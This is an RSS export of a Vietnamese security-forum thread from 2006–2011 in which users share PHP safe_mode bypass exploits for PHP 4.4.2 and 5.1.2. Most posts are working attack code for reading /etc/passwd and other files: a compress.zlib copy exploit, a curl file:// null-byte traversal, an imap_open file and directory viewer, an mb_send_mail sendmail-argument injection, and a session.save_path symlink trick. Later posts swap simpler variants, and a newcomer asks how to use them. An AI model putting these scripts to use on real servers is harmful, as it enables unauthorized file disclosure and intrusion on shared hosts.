<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass"]]></title>
		<link>/hvaonline/posts/list/13.html</link>
		<description><![CDATA[Latest messages posted in the topic "PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass</title>
				<description><![CDATA[ bài này có lâu rồi,nhưng thấy còn dùng được nên post lên đây cho mọi người tham khảo

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;?php
/*
Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2
by Maksymilian Arciemowicz SecurityReason.Com
cxib &#91;at&#93; securityreason &#91;dot&#93; com and max &#91;at&#93; jestsuper &#91;dot&#93; pl
pozdro sp3x
*/


$file=""; // File to Include... or use _GET _POST
$tymczas=""; // Set $tymczas to dir where you have 777 like /var/tmp



echo "&lt;PRE&gt;\n";
if&#40;empty&#40;$file&#41;&#41;{
if&#40;empty&#40;$_GET&#91;'file'&#93;&#41;&#41;{
if&#40;empty&#40;$_POST&#91;'file'&#93;&#41;&#41;{
die&#40;"\nSet varibles \$tymczas, \$file or use for varible file POST, GET like
?file=/etc/passwd\n &lt;B&gt;&lt;CENTER&gt;&lt;FONT
COLOR=\"RED\"&gt;SecurityReason.Com
Exploit&lt;/FONT&gt;&lt;/CENTER&gt;&lt;/B&gt;"&#41;;
} else {
$file=$_POST&#91;'file'&#93;;
}
} else {
$file=$_GET&#91;'file'&#93;;
}
}

$temp=tempnam&#40;$tymczas, "cx"&#41;;

if&#40;copy&#40;"compress.zlib://".$file, $temp&#41;&#41;{
$zrodlo = fopen&#40;$temp, "r"&#41;;
$tekst = fread&#40;$zrodlo, filesize&#40;$temp&#41;&#41;;
fclose&#40;$zrodlo&#41;;
echo "&lt;B&gt;--- Start File ".htmlspecialchars&#40;$file&#41;."
-------------&lt;/B&gt;\n".htmlspecialchars&#40;$tekst&#41;."\n&lt;B&gt;--- End File
".htmlspecialchars&#40;$file&#41;." ---------------\n";
unlink&#40;$temp&#41;;
die&#40;"\n&lt;FONT COLOR=\"RED\"&gt;&lt;B&gt;File
".htmlspecialchars&#40;$file&#41;." has been already loaded. SecurityReason Team
;&#93;&lt;/B&gt;&lt;/FONT&gt;"&#41;;
} else {
die&#40;"&lt;FONT COLOR=\"RED\"&gt;&lt;CENTER&gt;Sorry... File
&lt;B&gt;".htmlspecialchars&#40;$file&#41;."&lt;/B&gt; dosen't exists or you don't have
access.&lt;/CENTER&gt;&lt;/FONT&gt;"&#41;;
}
?&gt;</pre>
		</div>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#21297</guid>
				<link>/hvaonline/posts/list/3673.html#21297</link>
				<pubDate><![CDATA[Wed, 6 Sep 2006 21:46:55]]> GMT</pubDate>
				<author><![CDATA[ baothu]]></author>
			</item>
			<item>
				<title>PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass</title>
				<description><![CDATA[ nữa nè,qua CURL
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;?
$ch =
curl_init&#40;"file:///etc/passwd\x00/../../../../../../../../../../../../".__FILE__&#41;;
curl_exec&#40;$ch&#41;;
var_dump&#40;curl_exec&#40;$ch&#41;&#41;;
?&gt;</pre>
		</div>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#21324</guid>
				<link>/hvaonline/posts/list/3673.html#21324</link>
				<pubDate><![CDATA[Thu, 7 Sep 2006 00:34:04]]> GMT</pubDate>
				<author><![CDATA[ baothu]]></author>
			</item>
			<item>
				<title>PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass</title>
				<description><![CDATA[ Cái nè ByPass cũng cool nì,qua Imap Function
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;form action="" method="post"&gt;
&lt;select name="switch"&gt;
&lt;option selected="selected" value="file"&gt;View file&lt;/option&gt;
&lt;option value="dir"&gt;View dir&lt;/option&gt;
&lt;/select&gt;
&lt;input type="text" size="60" name="string"&gt;
&lt;input type="submit" value="go"&gt;
&lt;/form&gt;

&lt;?php
$string = !empty&#40;$_POST&#91;'string'&#93;&#41; ? $_POST&#91;'string'&#93; : 0;
$switch = !empty&#40;$_POST&#91;'switch'&#93;&#41; ? $_POST&#91;'switch'&#93; : 0;

if &#40;$string && $switch == "file"&#41; {
$stream = imap_open&#40;$string, "", ""&#41;;
if &#40;$stream == FALSE&#41;
die&#40;"Can't open imap stream"&#41;;

$str = imap_body&#40;$stream, 1&#41;;
if &#40;!empty&#40;$str&#41;&#41;
echo "&lt;pre&gt;".$str."&lt;/pre&gt;";
imap_close&#40;$stream&#41;;
} elseif &#40;$string && $switch == "dir"&#41; {
$stream = imap_open&#40;"/etc/passwd", "", ""&#41;;
if &#40;$stream == FALSE&#41;
die&#40;"Can't open imap stream"&#41;;

$string = explode&#40;"|",$string&#41;;
if &#40;count&#40;$string&#41; &gt; 1&#41;
$dir_list = imap_list&#40;$stream, trim&#40;$string&#91;0&#93;&#41;, trim&#40;$string&#91;1&#93;&#41;&#41;;
else
$dir_list = imap_list&#40;$stream, trim&#40;$string&#91;0&#93;&#41;, "*"&#41;;
echo "&lt;pre&gt;";
for &#40;$i = 0; $i &lt; count&#40;$dir_list&#41;; $i++&#41;
echo "$dir_list&#91;$i&#93;\n";
echo "&lt;/pre&gt;";
imap_close&#40;$stream&#41;;
}
?&gt;</pre>
		</div>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#21325</guid>
				<link>/hvaonline/posts/list/3673.html#21325</link>
				<pubDate><![CDATA[Thu, 7 Sep 2006 00:35:43]]> GMT</pubDate>
				<author><![CDATA[ baothu]]></author>
			</item>
			<item>
				<title>PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass</title>
				<description><![CDATA[ Còn đây là mb_sendmail
<blockquote>
&lt;?php
$rek= "hehehehe";
if (file_exists($rek)) unlink($rek);
$file = "/etc/passwd";
$xploit = "-C ".$file." -X ".getcwd()."/".$rek;
mb_send_mail(NULL, NULL, NULL, NULL, $xploit);
echo "&lt;pre&gt;".file_get_contents($file)."&lt;/pre&gt;"; 
?&gt;
&nbsp;
		</blockquote>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#21327</guid>
				<link>/hvaonline/posts/list/3673.html#21327</link>
				<pubDate><![CDATA[Thu, 7 Sep 2006 00:37:46]]> GMT</pubDate>
				<author><![CDATA[ baothu]]></author>
			</item>
			<item>
				<title>PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass</title>
				<description><![CDATA[ Init set,chưa test
<blockquote>
1) Make the following script:
&lt;?php                                                          
ini_set("session.save_path","/path/where/sess_foo/symlink/is/");
session_start();                                            
$_SESSION['bar'] = "bar";                         
session_write_close();
?&gt;                                                        
2) Call this script with ?PHPSESSID=foo      
&nbsp;
		</blockquote>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#21328</guid>
				<link>/hvaonline/posts/list/3673.html#21328</link>
				<pubDate><![CDATA[Thu, 7 Sep 2006 00:38:33]]> GMT</pubDate>
				<author><![CDATA[ baothu]]></author>
			</item>
			<item>
				<title>PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass</title>
				<description><![CDATA[ Thực ra ko cần dài dòng đến vậy
Khi có được 1 con shell chỉ cần 
copy("compress.zlib://etc/passwd","&lt;writeable&gt;");

thế là đủ]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#27417</guid>
				<link>/hvaonline/posts/list/3673.html#27417</link>
				<pubDate><![CDATA[Fri, 1 Dec 2006 17:59:31]]> GMT</pubDate>
				<author><![CDATA[ Luke]]></author>
			</item>
			<item>
				<title>Re: PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass</title>
				<description><![CDATA[ tks mấy bác nha mấy cái này hay đó để em test hết xem.
còn cái của anh Luke em mới thấy lần đâu để test luôn ko biết có bypass qua mọi trường hợp safe on không anh?
và cho em hỏi thêm nữa là liệu có cách nào local ở bluehost không ?]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#27452</guid>
				<link>/hvaonline/posts/list/3673.html#27452</link>
				<pubDate><![CDATA[Fri, 1 Dec 2006 20:49:37]]> GMT</pubDate>
				<author><![CDATA[ hieuhoc]]></author>
			</item>
			<item>
				<title>Re: PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass</title>
				<description><![CDATA[ He he tui có một cách giản đơn hơn cả luke

readfile("/etc/passwd");

Chấp cả Safe_mode vì đây là một hàm khá thông dụng trong việc đọc file nên ít server dám chặn nó 
 :mrgreen: ]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#39169</guid>
				<link>/hvaonline/posts/list/3673.html#39169</link>
				<pubDate><![CDATA[Tue, 30 Jan 2007 23:50:22]]> GMT</pubDate>
				<author><![CDATA[ xnohat]]></author>
			</item>
			<item>
				<title>Re: PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass</title>
				<description><![CDATA[ Mình có 1 thấy mắc là hầu hết các cách trên toàn bypass safe_mod để xem (cat) 1 file nào đó nhưng khi local exploit thì phải dùng những lệnh kèm theo như ls .. để biết tên file/folder đó mà view chứ, nhưng nếu safe mod được bật thì ta ko thể ls được ngoài thư mục của ta, vậy là sao bypass safe_mod để thực hiện những lệnh như ls .. ?]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#39193</guid>
				<link>/hvaonline/posts/list/3673.html#39193</link>
				<pubDate><![CDATA[Wed, 31 Jan 2007 01:33:48]]> GMT</pubDate>
				<author><![CDATA[ rickb]]></author>
			</item>
			<item>
				<title>Re: PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">hackernohat wrote:</cite><br>
		<blockquote>He he tui có một cách giản đơn hơn cả luke

readfile("/etc/passwd");

Chấp cả Safe_mode vì đây là một hàm khá thông dụng trong việc đọc file nên ít server dám chặn nó 
 :mrgreen: &nbsp;
		</blockquote>
vậy là pác chưa thấy quan tài rồi  :evil:  nhiều srv dùng readfile thì cũng pó thôi  ]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#39300</guid>
				<link>/hvaonline/posts/list/3673.html#39300</link>
				<pubDate><![CDATA[Wed, 31 Jan 2007 19:45:11]]> GMT</pubDate>
				<author><![CDATA[ ~simon~]]></author>
			</item>
			<item>
				<title>PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass</title>
				<description><![CDATA[ không cần ls đâu mà
hầu hết  chỉ để view con /etc/paswd thui
còn ls làm chi]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#58093</guid>
				<link>/hvaonline/posts/list/3673.html#58093</link>
				<pubDate><![CDATA[Wed, 9 May 2007 16:22:33]]> GMT</pubDate>
				<author><![CDATA[ n00ne]]></author>
			</item>
			<item>
				<title>PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">baothu wrote:</cite><br>
		<blockquote>nữa nè,qua CURL
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;?
$ch =
curl_init&#40;"file:///etc/passwd\x00/../../../../../../../../../../../../".__FILE__&#41;;
curl_exec&#40;$ch&#41;;
var_dump&#40;curl_exec&#40;$ch&#41;&#41;;
?&gt;</pre>
		</div>&nbsp;
		</blockquote>

Cậu có thể phân tích kĩ code này không? Tại sao lại dùng cái này thế:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>curl_init&#40;"file:///etc/passwd\x00/../../../../../../../../../../../../".__FILE__&#41;;</pre>
		</div>
mà không dùng cái này:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>curl_init&#40;"file://etc/passwd\x00/../../../../../../../../../../../../".__FILE__&#41;;</pre>
		</div>
và cái này :
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>curl_init&#40;"file:///etc/passwd/../../../../../../../../../../../../".__FILE__&#41;;</pre>
		</div>

Giải thích cho mình rõ được không???
Ko hiểu lắm mặc dù đã đọc tài liệu.
]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#62727</guid>
				<link>/hvaonline/posts/list/3673.html#62727</link>
				<pubDate><![CDATA[Fri, 1 Jun 2007 14:55:34]]> GMT</pubDate>
				<author><![CDATA[ smile_sad]]></author>
			</item>
			<item>
				<title>Sử dụng code bypass PHP</title>
				<description><![CDATA[ Mình là newbie! Mong các bạn hướng dẫn giúp! Mấy đoạn code mà mấy bạn up lên! Mình xài như thế nào?? Các bạn có thể hướng dẫn cho mình được không?]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#228871</guid>
				<link>/hvaonline/posts/list/3673.html#228871</link>
				<pubDate><![CDATA[Thu, 6 Jan 2011 03:17:44]]> GMT</pubDate>
				<author><![CDATA[ saphira]]></author>
			</item>
			<item>
				<title>PHP 4.4.2 and PHP 5.1.2 Safe Mode Bypass</title>
				<description><![CDATA[ Cái này giải thích từng cái thì chẳng biết bao giờ mới xong

Đề hiểu được cần phải:

Biết lập trình bằng PHP
Search thông tin về các hàm trên tại http://php.net/manual/en/index.php]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/3673.html#228873</guid>
				<link>/hvaonline/posts/list/3673.html#228873</link>
				<pubDate><![CDATA[Thu, 6 Jan 2011 03:57:48]]> GMT</pubDate>
				<author><![CDATA[ xnohat]]></author>
			</item>
	</channel>
</rss>
